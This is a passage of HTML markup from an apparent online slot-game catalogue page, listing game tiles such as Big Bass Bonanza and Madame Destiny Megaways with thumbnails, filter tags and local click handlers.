          <h5 data-title="Bonanza Gold™">Bonanza Gold™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Christmas Carol Megaways" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Christmas Carol Megaways', '/assets/games/i/165x220/cd70edb483536afc3e4e7d240d9380fc.webp?v=0.1' , 'vs20xmascarol', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/cd70edb483536afc3e4e7d240d9380fc.webp?v=0.1" src="/assets/games/i/165x220/cd70edb483536afc3e4e7d240d9380fc.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Christmas Carol Megaways">Christmas Carol Megaways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Bonanza™" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Bonanza™', '/assets/games/i/165x220/49769f18f6cb5afd9842d0d195b6d153.webp?v=0.1' , 'vs10bbbonanza', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/49769f18f6cb5afd9842d0d195b6d153.webp?v=0.1" src="/assets/games/i/165x220/49769f18f6cb5afd9842d0d195b6d153.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Bonanza™">Big Bass Bonanza™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Pirate Gold Deluxe" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Pirate Gold Deluxe', '/assets/games/i/165x220/518cb85541fd2f27897c06f5502a3536.webp?v=0.1' , 'vs40pirgold', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/518cb85541fd2f27897c06f5502a3536.webp?v=0.1" src="/assets/games/i/165x220/518cb85541fd2f27897c06f5502a3536.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Pirate Gold Deluxe">Pirate Gold Deluxe</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Emerald King" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Emerald King', '/assets/games/i/165x220/0d174a3d3a5c4eb09fb0c6652acfc551.webp?v=0.1' , 'vs20eking', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0d174a3d3a5c4eb09fb0c6652acfc551.webp?v=0.1" src="/assets/games/i/165x220/0d174a3d3a5c4eb09fb0c6652acfc551.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Emerald King">Emerald King</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dragon Tiger" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dragon Tiger', '/assets/games/i/165x220/e6946a8377c9e4df3057701228cda495.webp?v=0.1' , 'vs1024dtiger', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e6946a8377c9e4df3057701228cda495.webp?v=0.1" src="/assets/games/i/165x220/e6946a8377c9e4df3057701228cda495.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dragon Tiger">Dragon Tiger</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Aztec Gems Deluxe™" data-filter="ALL,CLASSIC" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Aztec Gems Deluxe™', '/assets/games/i/165x220/5aef08da394960a741ed5f8385f1b5d3.webp?v=0.1' , 'vs9aztecgemsdx', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/5aef08da394960a741ed5f8385f1b5d3.webp?v=0.1" src="/assets/games/i/165x220/5aef08da394960a741ed5f8385f1b5d3.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Aztec Gems Deluxe™">Aztec Gems Deluxe™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Book of Kingdoms" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Book of Kingdoms', '/assets/games/i/165x220/015c1bcefc69ff961f69489efb361c02.webp?v=0.1' , 'vs25bkofkngdm', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/015c1bcefc69ff961f69489efb361c02.webp?v=0.1" src="/assets/games/i/165x220/015c1bcefc69ff961f69489efb361c02.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Book of Kingdoms">Book of Kingdoms</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Voodoo Magic™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Voodoo Magic™', '/assets/games/i/165x220/1d834b62bd528dad4755bdd45bb7ec0b.webp?v=0.1' , 'vs40voodoo', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/1d834b62bd528dad4755bdd45bb7ec0b.webp?v=0.1" src="/assets/games/i/165x220/1d834b62bd528dad4755bdd45bb7ec0b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Voodoo Magic™">Voodoo Magic™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mysterious Egypt™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mysterious Egypt™', '/assets/games/i/165x220/bcf2388f5e6d87138444d20cac465da7.webp?v=0.1' , 'vs10wildtut', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/bcf2388f5e6d87138444d20cac465da7.webp?v=0.1" src="/assets/games/i/165x220/bcf2388f5e6d87138444d20cac465da7.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mysterious Egypt™">Mysterious Egypt™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Golden Ox™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Golden Ox™', '/assets/games/i/165x220/a07e722699f8cc744e004816f870a814.webp?v=0.1' , 'vs25gldox', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/a07e722699f8cc744e004816f870a814.webp?v=0.1" src="/assets/games/i/165x220/a07e722699f8cc744e004816f870a814.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Golden Ox™">Golden Ox™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dragon Kingdom Eyes of Fire™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dragon Kingdom Eyes of Fire™', '/assets/games/i/165x220/8f59cae97645b8395d7a11cef8f6cd40.webp?v=0.1' , 'vs5drmystery', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/8f59cae97645b8395d7a11cef8f6cd40.webp?v=0.1" src="/assets/games/i/165x220/8f59cae97645b8395d7a11cef8f6cd40.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dragon Kingdom Eyes of Fire™">Dragon Kingdom Eyes of Fire™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Madame Destiny Megaways™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Madame Destiny Megaways™', '/assets/games/i/165x220/3b8f24d1869177f3c9499b590202454c.webp?v=0.1' , 'vswaysmadame', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/3b8f24d1869177f3c9499b590202454c.webp?v=0.1" src="/assets/games/i/165x220/3b8f24d1869177f3c9499b590202454c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Madame Destiny Megaways™">Madame Destiny Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Congo Cash™" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Congo Cash™', '/assets/games/i/165x220/ee9b693d6c9ed883f4e585028b2555ce.webp?v=0.1' , 'vs432congocash', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/ee9b693d6c9ed883f4e585028b2555ce.webp?v=0.1" src="/assets/games/i/165x220/ee9b693d6c9ed883f4e585028b2555ce.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Congo Cash™">Congo Cash™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Emerald King Rainbow Road™" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Emerald King Rainbow Road™', '/assets/games/i/165x220/2db16ad9aa0bc15925134c96fa550f93.webp?v=0.1' , 'vs20ekingrr', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/2db16ad9aa0bc15925134c96fa550f93.webp?v=0.1" src="/assets/games/i/165x220/2db16ad9aa0bc15925134c96fa550f93.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Emerald King Rainbow Road™">Emerald King Rainbow Road™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Hand of Midas" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Hand of Midas', '/assets/games/i/165x220/cb3fb92b620e80ac8d22cd3d78fe00f6.webp?v=0.1' , 'vs20midas', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/cb3fb92b620e80ac8d22cd3d78fe00f6.webp?v=0.1" src="/assets/games/i/165x220/cb3fb92b620e80ac8d22cd3d78fe00f6.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Hand of Midas">The Hand of Midas</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Eye of the Storm" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Eye of the Storm', '/assets/games/i/165x220/025dddd255e888953aa13634f963ef75.webp?v=0.1' , 'vs10eyestorm', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/025dddd255e888953aa13634f963ef75.webp?v=0.1" src="/assets/games/i/165x220/025dddd255e888953aa13634f963ef75.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Eye of the Storm">Eye of the Storm</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Joker King™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Joker King™', '/assets/games/i/165x220/fe55eb4843c14916e9d43134e1677e9a.webp?v=0.1' , 'vs25jokerking', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/fe55eb4843c14916e9d43134e1677e9a.webp?v=0.1" src="/assets/games/i/165x220/fe55eb4843c14916e9d43134e1677e9a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Joker King™">Joker King™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hot to Burn Hold and Spin" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hot to Burn Hold and Spin', '/assets/games/i/165x220/31275b51276167bd6c1df324fcd725b0.webp?v=0.1' , 'vs20hburnhs', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/31275b51276167bd6c1df324fcd725b0.webp?v=0.1" src="/assets/games/i/165x220/31275b51276167bd6c1df324fcd725b0.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hot to Burn Hold and Spin">Hot to Burn Hold and Spin</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fishin Reels" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fishin Reels', '/assets/games/i/165x220/605390babbf83a5bd4fce8f30cf7ce63.webp?v=0.1' , 'vs10goldfish', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/605390babbf83a5bd4fce8f30cf7ce63.webp?v=0.1" src="/assets/games/i/165x220/605390babbf83a5bd4fce8f30cf7ce63.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fishin Reels">Fishin Reels</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Temujin Treasures" data-filter="ALL,BUY BONUS FEATURE,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Temujin Treasures', '/assets/games/i/165x220/89d4f088236f834b4af7001b105ff828.webp?v=0.1' , 'vs1024temuj', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/89d4f088236f834b4af7001b105ff828.webp?v=0.1" src="/assets/games/i/165x220/89d4f088236f834b4af7001b105ff828.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Temujin Treasures">Temujin Treasures</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Juicy Fruits" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Juicy Fruits', '/assets/games/i/165x220/418da590670fa4328817f723c08b360f.webp?v=0.1' , 'vs50juicyfr', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/418da590670fa4328817f723c08b360f.webp?v=0.1" src="/assets/games/i/165x220/418da590670fa4328817f723c08b360f.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Juicy Fruits">Juicy Fruits</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Booster" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Booster', '/assets/games/i/165x220/41a5b2a056e70bd72fa801f72fb5576d.webp?v=0.1' , 'vs20wildboost', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/41a5b2a056e70bd72fa801f72fb5576d.webp?v=0.1" src="/assets/games/i/165x220/41a5b2a056e70bd72fa801f72fb5576d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Booster">Wild Booster</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Power of Thor Megaways" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Power of Thor Megaways', '/assets/games/i/165x220/5626a32b3c0a79d1e09b5d9268679d64.webp?v=0.1' , 'vswayshammthor', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/5626a32b3c0a79d1e09b5d9268679d64.webp?v=0.1" src="/assets/games/i/165x220/5626a32b3c0a79d1e09b5d9268679d64.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Power of Thor Megaways">Power of Thor Megaways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hot Fiesta" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hot Fiesta', '/assets/games/i/165x220/97e272904ee194e064b0a4f751db13a4.webp?v=0.1' , 'vs25hotfiesta', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/97e272904ee194e064b0a4f751db13a4.webp?v=0.1" src="/assets/games/i/165x220/97e272904ee194e064b0a4f751db13a4.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hot Fiesta">Hot Fiesta</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Buffalo King Megaways" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Buffalo King Megaways', '/assets/games/i/165x220/912fc62eb71e6d022a95543b701f8b5d.webp?v=0.1' , 'vswaysbufking', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/912fc62eb71e6d022a95543b701f8b5d.webp?v=0.1" src="/assets/games/i/165x220/912fc62eb71e6d022a95543b701f8b5d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Buffalo King Megaways">Buffalo King Megaways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Amazing Money Machine" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Amazing Money Machine', '/assets/games/i/165x220/42fcdd7ada8988c32bb17442017b3018.webp?v=0.1' , 'vs10amm', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/42fcdd7ada8988c32bb17442017b3018.webp?v=0.1" src="/assets/games/i/165x220/42fcdd7ada8988c32bb17442017b3018.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Amazing Money Machine">The Amazing Money Machine</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Panda Fortune 2" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Panda Fortune 2', '/assets/games/i/165x220/20cecc256237429a1e154718667594a4.webp?v=0.2' , 'vs25pandatemple', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/20cecc256237429a1e154718667594a4.webp?v=0.2" src="/assets/games/i/165x220/20cecc256237429a1e154718667594a4.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Panda Fortune 2">Panda Fortune 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Floating Dragon" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Floating Dragon', '/assets/games/i/165x220/5e7fdb678e910ea56491443186eda407.webp?v=0.1' , 'vs10floatdrg', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/5e7fdb678e910ea56491443186eda407.webp?v=0.1" src="/assets/games/i/165x220/5e7fdb678e910ea56491443186eda407.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Floating Dragon">Floating Dragon</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Rise of Samurai Megaways™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Rise of Samurai Megaways™', '/assets/games/i/165x220/3cf7441a63dc10c95ac3c789a2e1dfac.webp?v=0.1' , 'vswayssamurai', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/3cf7441a63dc10c95ac3c789a2e1dfac.webp?v=0.1" src="/assets/games/i/165x220/3cf7441a63dc10c95ac3c789a2e1dfac.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Rise of Samurai Megaways™">Rise of Samurai Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Aztec King™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Aztec King™', '/assets/games/i/165x220/41a552d8271dd74d573b8dcf0c078f56.webp?v=0.1' , 'vs25aztecking', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/41a552d8271dd74d573b8dcf0c078f56.webp?v=0.1" src="/assets/games/i/165x220/41a552d8271dd74d573b8dcf0c078f56.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Aztec King™">Aztec King™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hokkaido Wolf™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hokkaido Wolf™', '/assets/games/i/165x220/b789f567e22592c381bdcc59322fc06d.webp?v=0.1' , 'vs576hokkwolf', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/b789f567e22592c381bdcc59322fc06d.webp?v=0.1" src="/assets/games/i/165x220/b789f567e22592c381bdcc59322fc06d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hokkaido Wolf™">Hokkaido Wolf™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Magic Cauldron - Enchanted Brew™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Magic Cauldron - Enchanted Brew™', '/assets/games/i/165x220/c65ab387473a33d8ed878b33a83d5b24.webp?v=0.1' , 'vs20magicpot', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/c65ab387473a33d8ed878b33a83d5b24.webp?v=0.1" src="/assets/games/i/165x220/c65ab387473a33d8ed878b33a83d5b24.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Magic Cauldron - Enchanted Brew™">The Magic Cauldron - Enchanted Brew™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="5 Lions Megaways™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '5 Lions Megaways™', '/assets/games/i/165x220/6e6a2224279e8dcec311771dfc0d2d3c.webp?v=0.1' , 'vswayslions', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/6e6a2224279e8dcec311771dfc0d2d3c.webp?v=0.1" src="/assets/games/i/165x220/6e6a2224279e8dcec311771dfc0d2d3c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="5 Lions Megaways™">5 Lions Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Cash Elevator™" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Cash Elevator™', '/assets/games/i/165x220/d5efed1c24b538dd573074ede2adab5a.webp?v=0.1' , 'vs20terrorv', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/d5efed1c24b538dd573074ede2adab5a.webp?v=0.1" src="/assets/games/i/165x220/d5efed1c24b538dd573074ede2adab5a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Cash Elevator™">Cash Elevator™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dragon Hot Hold and Spin™" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dragon Hot Hold and Spin™', '/assets/games/i/165x220/5e1227673c41160194d940c1f8a283dd.webp?v=0.1' , 'vs5drhs', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/5e1227673c41160194d940c1f8a283dd.webp?v=0.1" src="/assets/games/i/165x220/5e1227673c41160194d940c1f8a283dd.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dragon Hot Hold and Spin™">Dragon Hot Hold and Spin™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Empty the Bank™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Empty the Bank™', '/assets/games/i/165x220/08ba38ef46c87c5a9a48569f7d8eb150.webp?v=0.1' , 'vs20emptybank', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/08ba38ef46c87c5a9a48569f7d8eb150.webp?v=0.1" src="/assets/games/i/165x220/08ba38ef46c87c5a9a48569f7d8eb150.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
